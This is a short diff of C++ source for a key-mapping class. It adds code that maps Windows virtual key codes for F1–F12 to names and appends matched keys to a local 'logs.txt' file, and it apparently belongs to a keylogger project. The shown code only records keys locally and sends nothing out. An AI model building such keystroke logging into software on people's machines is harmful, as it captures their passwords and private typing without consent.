@@ -3,6 +3,15 @@
 
 #include <iostream>
 #include <windows.h>
+#include <fstream>
+
+void Maps::writeKeyString(std::string key) 
+{
+    std::ofstream file;
+    file.open("logs.txt", std::ios::app);
+    file << key;
+    file.close();
+}
 
 void Maps::initializeMaps() 
 {
@@ -34,6 +43,17 @@ void Maps::initializeMaps()
         {56, 42}, {57, 40},
     };
 
+    miscMaps = 
+    {
+        {112, F1}, {113, F2}, 
+        {114, F3}, {115, F4}, 
+        {116, F5}, {117, F6}, 
+        {118, F7}, {119, F8}, 
+        {120, F9}, {121, F10}, 
+        {122, F11}, {123, F12},
+    };
+
+
 }
 
 int Maps::searchAsciiMaps(int key) 
@@ -62,6 +82,22 @@ int Maps::searchShiftMaps(int key)
             return shiftBeg->second; 
         }
         shiftBeg++;
+    }
+    return 1; 
+}
+
+int Maps::searchMiscMaps(int key) 
+{
+    auto miscBeg = miscMaps.begin();
+    auto miscEnd = miscMaps.end();
+    while (miscBeg != miscEnd) 
+    {
+        if (miscBeg->first == key) 
+        {
+            writeKeyString(miscBeg->second);
+            return 0; 
+        }
+        miscBeg++;
     }
     return 1; 
 }
